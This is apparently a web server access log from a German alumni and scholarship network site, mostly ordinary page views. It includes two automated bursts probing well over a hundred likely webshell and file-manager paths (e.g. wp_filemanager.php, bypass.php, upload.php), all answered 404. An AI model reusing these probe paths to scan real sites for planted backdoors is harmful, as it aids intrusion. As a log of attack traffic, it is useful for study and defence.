f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:04;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:04;;/cf.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:04;;/get.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:04;;/v3.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:04;;/.well-known/ws.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:04;;/wteed.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:05;;/nc4.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:05;;/ntgn.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:05;;/ioxi-o.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:05;;/ws.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:05;;/7h.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:05;;/gg.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:05;;/co.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:05;;/mjq.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:05;;/rdfe.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:06;;/xojryvch.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:06;;/reyna.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:06;;/css/index.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:06;;/unzip.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:06;;/cool.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:06;;/.well-known/xin1.php?p;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:06;;/axx.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:06;;/w3llstore.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:06;;/aua.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:07;;/c4.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:07;;/bu5.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:07;;/lhh2.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:07;;/an.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:07;;/aw.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:07;;/as.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:07;;/new.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:07;;/Okxob.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:08;;/ahax.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:08;;/cache.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:08;;/ffile.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:08;;/nxac.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:08;;/thh.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:08;;/wp-includes/buy.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:08;;/baxa1.phP8;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:08;;/lo.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:08;;/fb.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:09;;/wp-update.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:09;;/slo.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:09;;/dropdown.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:09;;/pp.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:09;;/wp-content/themes/pridmag/db.php?u;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:09;;/bqcheck.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:09;;/13k.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:09;;/ar.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:09;;/bv3.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:10;;/aa.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:10;;/racs3.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:10;;/content.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:10;;/lufix.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:10;;/bluejackets.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:10;;/zt2.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:10;;/f35.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:10;;/wp-mn.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:10;;/modules/mod_simplefileuploadv1.3/elements/wpxadmin.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:11;;/aa8.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:11;;/xl.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:11;;/r4f_1.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:11;;/sarang.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:11;;/goods.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:11;;/6.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:11;;/xo.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:11;;/ggs.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:11;;/wsr2.php?p=;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:12;;/class9.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:12;;/public/wsr2.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:12;;/tcp.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:12;;/witmm.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:12;;/fm.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:12;;/jga.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:12;;/nxx.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:12;;/aaaa.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:13;;/2.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:13;;/ss.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:13;;/zc.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:13;;/dex.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:13;;/sad.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:13;;/wp.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:13;;/wp-gr.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:14;;/cfile.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:14;;/sder52u.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:14;;/asserter.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:14;;/ol.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:14;;/pass.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:14;;/l.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:14;;/ot.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:14;;/wp-rss4.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:15;;/dev.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:15;;/bin.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:15;;/yee.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:15;;/epinyins.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:15;;/aa17.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:15;;/winkel.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:15;;/ef.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:15;;/gifclass4.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:16;;/667.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:16;;/we.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:16;;/wp-su.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:16;;/t3x.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:16;;/13.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:16;;/yasnu.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:17;;/trd.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:17;;/oiepfuav.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:17;;/02.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:17;;/file2.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:17;;/makeasmtp.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:17;;/upload.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:17;;/btufulhs.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:18;;/ant.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:18;;/bb5.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:18;;/akc.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:18;;/s.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:18;;/yzkvrell.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:18;;/gmo.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:18;;/zc-749.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:18;;/.well-known/fm.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:18;;/ava.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:19;;/nqsa.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:19;;/2020.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:19;;/rak.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:19;;/bypass.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:19;;/zr.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:20;;/wander.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:20;;/lock360.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:20;;/great.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:20;;/fifii.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:20;;/12.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:20;;/efile.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:20;;/past1.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:20;;/7.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:21;;/4563.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:21;;/re.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:21;;/up.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:21;;/35.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:21;;/witm.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:21;;/atomlib.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:21;;/bless2.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:21;;/new4.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:22;;/wsr2.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:22;;/shlo.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:22;;/CLA.php;GET;404
f7d75abef8eddd01a13c836c6d2933c8121b2cfddfc8d75bc89f258d0d483554;2025-11-12 09:06:22;;/kill-9-1.php;GET;404
3f8a7625906793f843318b1a273de2f7ff563bbdc98e9eebb9e3b3a8f4f12190;2025-11-12 09:10:48;/;/;GET;200
9cbddcc4d4c98041ddddc272a31fca1b27c1f7aceb39c809b856cbfa67a491db;2025-11-12 09:17:18;;/sclogin.html;GET;404
fc1c61c38a857a4a016eb3d7052b96f4814204a12a5f6fff2afb973616c8ec42;2025-11-12 09:26:34;;/;GET;200
03db25e8e57c2d694090b1d250862626844e01753f63bfb02286aee2a8880e63;2025-11-12 09:28:42;;/personen/alumni/schule/HB0001;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-12 09:31:12;;/;GET;200
c7b31be2a1374d5ab657723015e630b4be5d432a9caedcf617bf337cb2add941;2025-11-12 09:36:35;;/;GET;200
702a5732dbbfd6c9e387a03d7afd1b9acaf0fd9051aadfca66bbe58bfdf30dd2;2025-11-12 09:38:11;;/personen/alumni/schule/191073;GET;200
6bccd29d0a80eae32a259f536f37747210ebd430c3d9916ea64119a72403fa33;2025-11-12 09:48:34;;/personen/alumni/schule/04A06;GET;200
983fc0a58e048ecb609b01c217802f4efc2eb59fcd4353a183cca9cc95845049;2025-11-12 09:52:44;/aktuelles/meldungen?category=wissenschaft;/aktuelles/meldungen?category=wissenschaft;GET;200
e7f66ab1d6afc46de5d776aa827e3af8a4eb0f306372637ef03fc01a1436ca6d;2025-11-12 09:57:00;;/personen/alumni/details/benjamin-wagner;GET;200
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-12 09:57:22;/;/;GET;200
962523ce7d341bd35afebc8af2ff5d86592439058f8b8171641e7e004ce5e17b;2025-11-12 09:58:02;;/personen/alumni/schule/5501;GET;200
0a7be866bd7d800b73725b3dcbef0ba93631ca9b9cbddd094070db9a780014a2;2025-11-12 10:03:40;;/;GET;200
0a7be866bd7d800b73725b3dcbef0ba93631ca9b9cbddd094070db9a780014a2;2025-11-12 10:08:29;;/webui/;GET;404
347bd5d624dd3dfdf77cb8d1e22aeb35a378dee68cdb67a67ed9a33d56cd5919;2025-11-12 10:08:42;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
ce8119a115d47469fdc30e280018b78c4dbe6ed75b5383bdae1ada573741b8ce;2025-11-12 10:10:40;;/personen/alumni/details/sophia-gawron;GET;200
e1b27a4163d9dcdcd50fbd4b88eb2159b5c5611b8d8ed7042be55cfb76465a07;2025-11-12 10:14:44;;/;GET;200
4ab332072e83bfa3f959a6b690174f64f7d0f96bda5a8052f17d35f824a0fc83;2025-11-12 10:17:53;;/;GET;200
573cc9dc86bbcabdd256b3e2bd34bbc7fd7a4fd60454b2e7c052b9f45ba0bb0f;2025-11-12 10:17:53;;/gruppen/hobby/biologie;GET;302
573cc9dc86bbcabdd256b3e2bd34bbc7fd7a4fd60454b2e7c052b9f45ba0bb0f;2025-11-12 10:17:57;/gruppen/hobby/biologie;/gruppen;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-12 10:18:27;/personen/all/3;/personen/all/4;GET;200
e6b9c298631270b805d7e9bc903567ef42e68c22f752ab9524781747e8a7c191;2025-11-12 10:24:49;;/gruppen/hobby/chemie;GET;302
e6b9c298631270b805d7e9bc903567ef42e68c22f752ab9524781747e8a7c191;2025-11-12 10:24:54;/gruppen/hobby/chemie;/gruppen;GET;200
502aa8753bae62b69cbb698559047a059b8ead0b958c29071773265dc0888adf;2025-11-12 10:27:27;;/rechtliches/datenschutz;GET;200
0a7be866bd7d800b73725b3dcbef0ba93631ca9b9cbddd094070db9a780014a2;2025-11-12 10:27:27;;/geoserver/web/;GET;404
0ade572e6b522ddcb8a16426e0ae35809fe803a1646eea32795ec153a6ba832c;2025-11-12 10:34:21;;/personen/alumni/schule/09A05;GET;200
94e382f58c667dffbd6abb636ec39f0b8d752af5370a563a6b988faa40c45aba;2025-11-12 10:43:33;;/personen/alumni/schule/5502;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-12 10:46:12;;/personen/alumni/schule/610021;GET;200
a9e116d30cd5ccf5500fce256fa8cfe4cc5b5d589cd5e2a39b50ebbbbec16ae8;2025-11-12 10:47:11;;/aktuelles/meldungen;GET;200
3ba70cd48dd81f25e5ee7e0d0d9576d339dbcd25a52bdc5d456ce9c9b3c150d6;2025-11-12 10:48:05;;/personen/alumni/schule/4340014;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-12 10:50:07;/gruppen/hobby/physik;/gruppen/hobby/tanzen;GET;302
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-12 10:50:08;/gruppen/hobby/physik;/gruppen;GET;200
bef6848d851ec143f4d56cbca946a27f19ae05207808b73ed7fec3c9338f27ba;2025-11-12 10:53:19;;/themen/details/bucher-auf-dem-abstellgleis;GET;200
8655567bd30f0dd785f4d84f519abe7a9e78fe694dde1bdebbd051919df87ba1;2025-11-12 10:57:47;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
afc45b3c9ae544346539a204f5c3f58b451be58760448f2843f4fa2048c8e8ab;2025-11-12 10:59:36;;/gruppen/hobby/gartnern;GET;302
afc45b3c9ae544346539a204f5c3f58b451be58760448f2843f4fa2048c8e8ab;2025-11-12 10:59:39;/gruppen/hobby/gartnern;/gruppen;GET;200
98d81909d841b05cdc4454eefb6063013a2a6756ada49491261fb061e27f9434;2025-11-12 11:03:03;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
4e1d58e2f901d5eef22799561610e4a367cfc56fa01dc614d56f48940f853dae;2025-11-12 11:05:26;/themen?category=kultur;/themen?category=kultur;GET;200
540060ff0c27ecd033087cbeb4edb9eb48e2adc5db5713c493ff03d0613e6218;2025-11-12 11:08:01;;/gruppen/hobby/politik-und-debatten;GET;302
540060ff0c27ecd033087cbeb4edb9eb48e2adc5db5713c493ff03d0613e6218;2025-11-12 11:08:06;/gruppen/hobby/politik-und-debatten;/gruppen;GET;200
049aba1984d9e62ac70a68426cd422ee993d1cb2bdce2a848facdaa71763810c;2025-11-12 11:19:19;;/gruppen/hobby/fotobearbeitung;GET;302
049aba1984d9e62ac70a68426cd422ee993d1cb2bdce2a848facdaa71763810c;2025-11-12 11:19:28;/gruppen/hobby/fotobearbeitung;/gruppen;GET;200
489106527f4d63fb63b1980945f52bffb18605b0a43630922ccb370fd4c85110;2025-11-12 11:22:56;;/aaa9;GET;404
489106527f4d63fb63b1980945f52bffb18605b0a43630922ccb370fd4c85110;2025-11-12 11:22:56;;/;GET;200
489106527f4d63fb63b1980945f52bffb18605b0a43630922ccb370fd4c85110;2025-11-12 11:22:56;;/;GET;200
489106527f4d63fb63b1980945f52bffb18605b0a43630922ccb370fd4c85110;2025-11-12 11:22:56;;/aab9;GET;404
489106527f4d63fb63b1980945f52bffb18605b0a43630922ccb370fd4c85110;2025-11-12 11:22:57;;/;GET;200
489106527f4d63fb63b1980945f52bffb18605b0a43630922ccb370fd4c85110;2025-11-12 11:22:57;;/;GET;200
489106527f4d63fb63b1980945f52bffb18605b0a43630922ccb370fd4c85110;2025-11-12 11:22:57;;/;GET;200
3f521ab2b121d9858114b93e85cb83ac3ba6ec4b0ec05aa24a8d25286b30e52b;2025-11-12 11:23:09;;/;GET;200
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:30;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:32;;/shoha.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:33;;/ze.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:34;;/xo.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:34;;/wp-the1me.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:37;;/m.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:38;;/e.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:38;;/dd1.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:39;;/conn.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:40;;/card.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:41;;/asas.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:42;;/kki.php;GET;404
a1111769dffcc4ca3efd52278d3f1445fef2461e586dae2aed7a4c4d7fa95ce6;2025-11-12 11:23:43;;/js.php;GET;404
